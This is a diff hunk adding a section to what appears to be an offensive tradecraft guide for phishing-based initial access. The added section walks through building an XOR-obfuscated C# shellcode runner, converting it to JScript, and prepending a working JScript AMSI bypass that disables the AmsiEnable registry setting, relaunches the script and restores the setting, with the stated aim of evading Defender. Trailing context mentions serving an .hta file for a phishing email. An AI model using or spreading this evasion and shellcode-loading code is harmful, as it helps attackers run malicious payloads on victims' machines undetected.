@@ -147,8 +147,40 @@ public class TestClass
 }
 
 ```
+**XOR-ed C# Shellcode Runner + DOTNET2JS + AMSI BYPASS IN JSCRIPT**
 
+- use our XOR_Helper to generate XOR-ed C# Shellcode
+- Put the XOR-ed shellcode into the shellcode script in ExampleAssembly.dll
+- Add a decryption function in the ExampleAssembly.dll after the buf variable like this
+```csharp
+        byte[] buf = <shellcode here x64>;
 
+//assuming your XOR key is 0xfa
+        for (int i = 0; i < buf.Length; i++)
+        {
+            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
+        }
+
+        int size = buf.Length;
+```
+- when your evil.js is created, open it and slam the following code at the top:
+```js
+var sh = new ActiveXObject('WScript.Shell');
+var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
+
+try{
+	var AmsiEnable = sh.RegRead(key);
+	if(AmsiEnable!=0){
+	throw new Error(1, '');
+	}
+}catch(e){
+	sh.RegWrite(key, 0, "REG_DWORD"); // neuter AMSI
+	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
+	sh.RegWrite(key, 1, "REG_DWORD"); // put it back
+	WScript.Quit(1);
+}
+```
+- This should bypass a noobish Defender and AMSI
 ### Sending the email!
 
 Make sure your apache server is running to serve the .hta
